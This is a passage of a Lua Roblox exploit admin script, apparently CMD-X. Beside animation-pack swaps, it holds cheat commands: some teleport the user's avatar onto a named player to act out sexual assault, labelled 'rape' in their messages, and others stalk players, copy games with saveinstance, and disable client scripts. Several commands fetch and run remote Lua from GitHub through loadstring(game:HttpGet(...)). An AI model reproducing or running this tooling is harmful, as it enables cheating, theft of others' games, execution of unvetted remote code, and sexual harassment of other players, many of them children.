			Char.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=657595757"
			Char.Animate.idle.Animation1.Weight.Value = "9"
			Char.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=657568135"
			Char.Animate.idle.Animation2.Weight.Value = "1"
			Char.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=658409194"
			Char.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=657564596"
			Char.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=657560551"
			Char.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=657557095"
			Char.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=657552124"
		elseif animpack == "astronaut" then
			local Char = cmdlp.Character
			Char.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=891609353"
			Char.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=891617961"
			Char.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=891621366"
			Char.Animate.idle.Animation1.Weight.Value = "9"
			Char.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=891633237"
			Char.Animate.idle.Animation2.Weight.Value = "1"
			Char.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=891627522"
			Char.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=891636393"
			Char.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=891639666"
			Char.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=891663592"
			Char.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=891636393"
		elseif animpack == "vampire" then
			local Char = cmdlp.Character
			Char.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083439238"
			Char.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083443587"
			Char.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083445855"
			Char.Animate.idle.Animation1.Weight.Value = "9"
			Char.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083450166"
			Char.Animate.idle.Animation2.Weight.Value = "1"
			Char.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083455352"
			Char.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083462077"
			Char.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=1083464683"
			Char.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=1083467779"
			Char.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083473930"
		elseif animpack == "robot" then
			local Char = cmdlp.Character
			Char.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616086039"
			Char.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616087089"
			Char.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616088211"
			Char.Animate.idle.Animation1.Weight.Value = "9"
			Char.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616089559"
			Char.Animate.idle.Animation2.Weight.Value = "1"
			Char.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616090535"
			Char.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616091570"
			Char.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=616092998"
			Char.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=616094091"
			Char.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616095330"
		elseif animpack == "levitation" then
			local Char = cmdlp.Character
			Char.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616003713"
			Char.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616005863"
			Char.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616006778"
			Char.Animate.idle.Animation1.Weight.Value = "9"
			Char.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616008087"
			Char.Animate.idle.Animation2.Weight.Value = "1"
			Char.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616008936"
			Char.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616010382"
			Char.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=616011509"
			Char.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=616012453"
			Char.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616013216"
		elseif animpack == "bubbly" then
			local Char = cmdlp.Character
			Char.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=909997997"
			Char.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=910001910"
			Char.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=910004836"
			Char.Animate.idle.Animation1.Weight.Value = "9"
			Char.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=910009958"
			Char.Animate.idle.Animation2.Weight.Value = "1"
			Char.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=910016857"
			Char.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=910025107"
			Char.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=910028158"
			Char.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=910030921"
			Char.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=910034870"
		elseif animpack == "werewolf" then
			local Char = cmdlp.Character
			Char.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1083182000"
			Char.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1083189019"
			Char.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1083195517"
			Char.Animate.idle.Animation1.Weight.Value = "9"
			Char.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1083214717"
			Char.Animate.idle.Animation2.Weight.Value = "1"
			Char.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1083218792"
			Char.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1083216690"
			Char.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=1083222527"
			Char.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=1083225406"
			Char.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1083178339"
		elseif animpack == "stylish" then
			local Char = cmdlp.Character
			Char.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616133594"
			Char.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616134815"
			Char.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616136790"
			Char.Animate.idle.Animation1.Weight.Value = "9"
			Char.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616138447"
			Char.Animate.idle.Animation2.Weight.Value = "1"
			Char.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616139451"
			Char.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616140816"
			Char.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=616143378"
			Char.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=616144772"
			Char.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616146177"
		elseif animpack == "mage" then
			local Char = cmdlp.Character
			Char.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=707826056"
			Char.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=707829716"
			Char.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=707742142"
			Char.Animate.idle.Animation1.Weight.Value = "9"
			Char.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=707855907"
			Char.Animate.idle.Animation2.Weight.Value = "1"
			Char.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=707853694"
			Char.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=707861613"
			Char.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=707876443"
			Char.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=707894699"
			Char.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=707897309"
		elseif animpack == "cartoony" then
			local Char = cmdlp.Character
			Char.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=742636889"
			Char.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=742637151"
			Char.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=742637544"
			Char.Animate.idle.Animation1.Weight.Value = "9"
			Char.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=742638445"
			Char.Animate.idle.Animation2.Weight.Value = "1"
			Char.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=742637942"
			Char.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=742638842"
			Char.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=742639220"
			Char.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=742639812"
			Char.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=742640026"
		elseif animpack == "zombie" then
			local Char = cmdlp.Character
			Char.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616156119"
			Char.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616157476"
			Char.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616158929"
			Char.Animate.idle.Animation1.Weight.Value = "9"
			Char.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616160636"
			Char.Animate.idle.Animation2.Weight.Value = "1"
			Char.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616161997"
			Char.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616163682"
			Char.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=616165109"
			Char.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=616166655"
			Char.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616168032"
		elseif animpack == "superhero" then
			local Char = cmdlp.Character
			Char.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=616104706"
			Char.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=616108001"
			Char.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=616111295"
			Char.Animate.idle.Animation1.Weight.Value = "9"
			Char.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=616113536"
			Char.Animate.idle.Animation2.Weight.Value = "1"
			Char.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=616115533"
			Char.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=616117076"
			Char.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=616119360"
			Char.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=616120861"
			Char.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=616122287"
		elseif animpack == "ninja" then
			local Char = cmdlp.Character
			Char.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=656114359"
			Char.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=656115606"
			Char.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=656117400"
			Char.Animate.idle.Animation1.Weight.Value = "9"
			Char.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=656118341"
			Char.Animate.idle.Animation2.Weight.Value = "1"
			Char.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=656117878"
			Char.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=656118852"
			Char.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=656119721"
			Char.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=656121397"
			Char.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=656121766"
		elseif animpack == "elder" then
			local Char = cmdlp.Character
			Char.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=845392038"
			Char.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=845396048"
			Char.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=845397899"
			Char.Animate.idle.Animation1.Weight.Value = "9"
			Char.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=845400520"
			Char.Animate.idle.Animation2.Weight.Value = "1"
			Char.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=845398858"
			Char.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=845386501"
			Char.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=845401742"
			Char.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=845403127"
			Char.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=845403856"
		elseif animpack == "oldschool" then
			local Char = cmdlp.Character
			Char.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=5319816685"
			Char.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=5319839762"
			Char.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=5319828216"
			Char.Animate.idle.Animation1.Weight.Value = "9"
			Char.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=5319831086"
			Char.Animate.idle.Animation2.Weight.Value = "1"
			Char.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=5319841935"
			Char.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=5319844329"
			Char.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=5319850266"
			Char.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=5319852613"
			Char.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=5319847204"
		elseif animpack == "confident" then
			local Char = cmdlp.Character
			Char.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1069946257"
			Char.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1069973677"
			Char.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1069977950"
			Char.Animate.idle.Animation1.Weight.Value = "9"
			Char.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1069987858"
			Char.Animate.idle.Animation2.Weight.Value = "1"
			Char.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1069984524"
			Char.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1070001516"
			Char.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=1070009914"
			Char.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=1070012133"
			Char.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1070017263"
		elseif animpack == "popstar" then
			local Char = cmdlp.Character
			Char.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1213044953"
			Char.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1212900995"
			Char.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1212900985"
			Char.Animate.idle.Animation1.Weight.Value = "9"
			Char.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1212900985"
			Char.Animate.idle.Animation2.Weight.Value = "1"
			Char.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1212954642"
			Char.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1212980348"
			Char.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=1212852603"
			Char.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=1212998578"
			Char.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1212980338"
		elseif animpack == "patrol" then
			local Char = cmdlp.Character
			Char.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1148811837"
			Char.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1148863382"
			Char.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1149612882"
			Char.Animate.idle.Animation1.Weight.Value = "9"
			Char.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1150842221"
			Char.Animate.idle.Animation2.Weight.Value = "1"
			Char.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1150944216"
			Char.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1150967949"
			Char.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=1151204998"
			Char.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=1151221899"
			Char.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1151231493"
		elseif animpack == "princess" then
			local Char = cmdlp.Character
			Char.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=940996062"
			Char.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=941000007"
			Char.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=941003647"
			Char.Animate.idle.Animation1.Weight.Value = "9"
			Char.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=941013098"
			Char.Animate.idle.Animation2.Weight.Value = "1"
			Char.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=941008832"
			Char.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=941015281"
			Char.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=941018893"
			Char.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=941025398"
			Char.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=941028902"
		elseif animpack == "cowboy" then
			local Char = cmdlp.Character
			Char.Animate.climb.ClimbAnim.AnimationId = "http://www.roblox.com/asset/?id=1014380606"
			Char.Animate.fall.FallAnim.AnimationId = "http://www.roblox.com/asset/?id=1014384571"
			Char.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=1014390418"
			Char.Animate.idle.Animation1.Weight.Value = "9"
			Char.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=1014398616"
			Char.Animate.idle.Animation2.Weight.Value = "1"
			Char.Animate.jump.JumpAnim.AnimationId = "http://www.roblox.com/asset/?id=1014394726"
			Char.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=1014401683"
			Char.Animate.swim.Swim.AnimationId = "http://www.roblox.com/asset/?id=1014406523"
			Char.Animate.swimidle.SwimIdle.AnimationId = "http://www.roblox.com/asset/?id=1014411816"
			Char.Animate.walk.WalkAnim.AnimationId = "http://www.roblox.com/asset/?id=1014421541"
		elseif animpack == "toilet" then
			local Char = cmdlp.Character
			Char.Animate.idle.Animation1.AnimationId = "http://www.roblox.com/asset/?id=4417977954"
			Char.Animate.idle.Animation2.AnimationId = "http://www.roblox.com/asset/?id=4417977954"
			Char.Animate.run.RunAnim.AnimationId = "http://www.roblox.com/asset/?id=4417979645"
		else
			opx("*","2 arguments are required for this command!")
		end
	end

	function useCommand.spin()
		local Spin = Instance.new("BodyAngularVelocity", cmdlp.Character.HumanoidRootPart)
		Spin.Name = "Spinning"
		if arguments[2] then
			if cmdnum(arguments[2]) then
				Spin.AngularVelocity = Vector3.new(0,arguments[2],0)
				Spin.MaxTorque = Vector3.new(0, math.huge, 0)
				opx("-","Now spinning at speed: "..arguments[2])
			else
				opx("*","A number is needed")
			end
		else
			Spin.AngularVelocity = Vector3.new(0,20,0)
			Spin.MaxTorque = Vector3.new(0, math.huge, 0)
			opx("-","Now spinning")
		end
	end

	function useCommand.unspin()
		opx("-","Stopped spinning")
		for i,v in pairs(cmdlp.Character.HumanoidRootPart:GetChildren()) do
			if v.Name == "Spinning" then
				v:Destroy()
			end
		end
	end

	function useCommand.hatspin()
		opx("-","Hats are now spinning")
		for i,v in pairs(cmdlp.Character:GetChildren()) do
			if v:IsA("Accessory") then
				local findForce = v.Handle:FindFirstChildOfClass("BodyForce")
				if findForce == nil then
					local a = Instance.new("BodyPosition")
					local b = Instance.new("BodyAngularVelocity")
					a.Parent = v.Handle
					b.Parent = v.Handle
					a.Name = "un"
					b.Name = "un2"
					v.Handle.AccessoryWeld:Destroy()
					b.AngularVelocity = Vector3.new(0,100,0)
					b.MaxTorque = Vector3.new(0,200,0)
					a.P = 30000
					a.D = 50
					game:GetService('RunService').Stepped:connect(function()
						a.Position = cmdlp.Character.Head.Position
					end)
				end
			end
		end
	end

	function useCommand.unhatspin()
		opx("-","Stopped spinning hats")
		for i,v in pairs(cmdlp.Character:GetChildren()) do
			if v:IsA("Accessory") then
				v.Handle.un:Destroy()
				v.Handle.un2:Destroy()
			end
		end
	end

	local ff = false
	function useCommand.facefuck()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				if target.Character and target.Character:FindFirstChild('Humanoid') then
					if ff == true then
						ff = false
						opx("-","Stopped facefucking/faceraping")
						cmdlp.Character.Humanoid.Sit = false			
						return
					else ff = true
						opx("-","Facefucking/faceraping enabled")
						while ff do
							cmdlp.Character.Humanoid.Sit = true
							cmdlp.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.Angles(0,math.rad(180),0)* CFrame.new(0,1.6,0.4)
							cmdlp.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new()
							wait()
						end
					end
				end
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.unfacefuck()
		opx("-","Stopped facefucking/faceraping")
		cmdlp.Character.Humanoid.Sit = false
		ff = false
	end

	local ff2 = false
	function useCommand.facefuckanim()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				facebangAnim = Instance.new("Animation")
				facebangAnim.AnimationId = "rbxassetid://148840371"
				facebang = cmdlp.Character.Humanoid:LoadAnimation(facebangAnim)
				facebang:Play(.1, 1, 1)
				facebang:AdjustSpeed(3)
				if target.Character and target.Character:FindFirstChild('Humanoid') then
					if ff2 == true then
						ff2 = false
						opx("-","Stopped facefucking/faceraping")				
						return
					else ff2 = true
						opx("-","Facefucking/faceraping enabled")
						while ff2 do
							cmdlp.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.Angles(0,math.rad(180),0)* CFrame.new(0.4,1.6,0.4)
							cmdlp.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new()
							wait()
						end
					end
				end
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.unfacefuckanim()
		ff2 = false
		facebang:Stop()
		facebang:Destroy()
		opx("-","Stopped facefucking/faceraping")
	end

	local pb = false
	function useCommand.piggyback()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				if target.Character and target.Character:FindFirstChild('Humanoid') then
					if pb == true then
						pb = false
						opx("-","Stopped riding/piggybacking")
						cmdlp.Character.Humanoid.Sit = false
						return
					else
						pb = true
						opx("-","Riding/piggybacking enabled")
						while pb do
							cmdlp.Character.Humanoid.Sit = true
							cmdlp.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(0), 0) * CFrame.new(0,1.6,0.4)
							cmdlp.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new()
							game:GetService("RunService").RenderStepped:Wait()
						end
					end
				end
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.unpiggyback()
		opx("-","Stopped piggybacking/riding")
		pb = false
		cmdlp.Character.Humanoid.Sit = false
	end

	local Bang = false
	function useCommand.fuck()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				flwnum = -1
				bangAnim = Instance.new("Animation")
				bangAnim.AnimationId = "rbxassetid://148840371"
				bang = cmdlp.Character.Humanoid:LoadAnimation(bangAnim)
				bang:Play(.1, 1, 1)
				bang:AdjustSpeed(3)
				if target.Character and target.Character:FindFirstChild('Humanoid') then
					if Bang == true then
						Follow = false
						Bang = false
						opx("-","Fuck/rape disabled")
						return
					else Bang = true
						opx("-","Fuck/rape enabled")
						while Bang do
							cmdlp.Character.HumanoidRootPart.CFrame = target.Character.HumanoidRootPart.CFrame + target.Character.HumanoidRootPart.CFrame.lookVector * flwnum
							cmdlp.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new()
							wait()
						end
					end
				end
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.unfuck()
		bang:Stop()
		bangAnim:Destroy()
		Bang = false
		opx("-","Rape/fuck disabled")
	end

	local Follow = false
	function useCommand.follow()
		if arguments[2] then
			target = findplr(arguments[2])
			if target then
				flwnum = -5
				if target.Character and target.Character:FindFirstChild('Humanoid') then
					if Follow == true then
						Follow = false;
						opx("-","Follow/stalk disabled")
						return
					else Follow = true
						opx("-","Follow/stalk enabled") 
					end
					while Follow do
						cmdlp.Character.HumanoidRootPart.CFrame=
							target.Character.HumanoidRootPart.CFrame +  target.Character.HumanoidRootPart.CFrame.lookVector * flwnum
						wait()
					end
				end
			else
				opx("*","Player does not exist!")
			end
		else
			opx("*","2 arguments are needed for this command!")
		end
	end

	function useCommand.unfollow()
		Follow = false
		opx("-","Stalk/follow disabled")
	end

	function useCommand.oldroblox()
		Confirm("Default", "This command is not reversible.")
		if Confirmation == true then
			for i,v in pairs(workspace:GetDescendants()) do
				if v:IsA("BasePart") then
					local dec = Instance.new("Texture", v)
					dec.Texture = "rbxassetid://48715260"
					dec.Face = "Top"
					dec.StudsPerTileU = "1"
					dec.StudsPerTileV = "1"
					dec.Transparency = v.Transparency
					v.Material = "Plastic"
					local dec2 = Instance.new("Texture", v)
					dec2.Texture = "rbxassetid://20299774"
					dec2.Face = "Bottom"
					dec2.StudsPerTileU = "1"
					dec2.StudsPerTileV = "1"
					dec2.Transparency = v.Transparency
					v.Material = "Plastic"
				end
			end
			game.Lighting.ClockTime = 12
			game.Lighting.GlobalShadows = false
			game.Lighting.Outlines = false
			for i,v in pairs(game.Lighting:GetDescendants()) do
				if v:IsA("Sky") then
					v:Destroy()
				end
			end
			local sky = Instance.new("Sky", game.Lighting)
			sky.SkyboxBk = "rbxassetid://161781263"
			sky.SkyboxDn = "rbxassetid://161781258"
			sky.SkyboxFt = "rbxassetid://161781261"
			sky.SkyboxLf = "rbxassetid://161781267"
			sky.SkyboxRt = "rbxassetid://161781268"
			sky.SkyboxUp = "rbxassetid://161781260"
			opx("-","Old Roblox game theme loaded")
		end
	end

	function useCommand.savegame()
		saveinstance()
		opx("-","Saved game in your workspace folder")
	end

	function useCommand.btools()
		local Clone_T = Instance.new("HopperBin", cmdlp.Backpack)
		Clone_T.BinType = "Clone"
		local Destruct = Instance.new("HopperBin", cmdlp.Backpack)
		Destruct.BinType = "Hammer"
		local Hold_T = Instance.new("HopperBin", cmdlp.Backpack)
		Hold_T.BinType = "Grab"
		opx("-","Building tools loaded")
	end

	function useCommand.fex()
		loadstring(game:GetObjects("rbxassetid://4698064966")[1].Source)()
		opx("-","Loaded F3X")
	end

	function useCommand.remotespy()
		loadstring(game:HttpGet("https://github.com/exxtremestuffs/SimpleSpySource/raw/master/SimpleSpy.lua"))()
		opx("-","Simple Spy has loaded (credits to exxtremestuffs)")
	end

	function useCommand.playerstalker()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/projects/PlayerStalkerV2.lua",true))()
		opx("-","Loaded PlayerStalker")
	end

	function useCommand.badger()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/others/badger.lua",true))()
		opx("-","Loaded Badger V2")
	end

	function useCommand.removeeffects()
		opx("-","Removed all effects")
		for i,v in pairs(game:GetDescendants()) do
			if v:IsA("Sparkles") or v:IsA("ParticleEmitter") or v:IsA("Fire") or v:IsA("Smoke") then
				v:Destroy()
			end
		end
	end

	function useCommand.removeseats()
		for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("Seat") or v:IsA("VehicleSeat") then
				v:Destroy()
			end
		end
		opx("-","Removed all seats")
	end

	XLS = {}
	function useCommand.removelocalscripts()
		opx("-","Removed all localscripts")
		for _,ls in pairs(game:GetDescendants()) do
			if ls:IsA("LocalScript") then
				ls.Disabled = true
				table.insert(XLS, ls)
			end
		end
	end

	function useCommand.restorelocalscripts()
		opx("-","Restored all localscripts")
		for _,v in pairs(XLS) do
			v.Disabled = false
		end
	end

	function useCommand.xray()
		transparent = true
		x(transparent)
		opx("-","X-Ray enabled")
	end

	function useCommand.unxray()
		transparent = false
		x(transparent)
		opx("-","X-Ray disabled")
	end

	function useCommand.tabs()
		if arguments[2] == "off" then
			opx("-","Turned off tabs")
			TabsOff = true
			HoldTab.Visible = false
			updatesaves()
		elseif arguments[2] == "on" then
			opx("-","Turned on tabs")
			TabsOff = false
			HoldTab.Visible = true
			updatesaves()
		else
			opx("*","2 arguments are required!")
		end
	end

	function useCommand.changetab()
		if arguments[3] then
			MoreArg = getstring(3)
			if arguments[2] == "1" then
				T1.Text = MoreArg
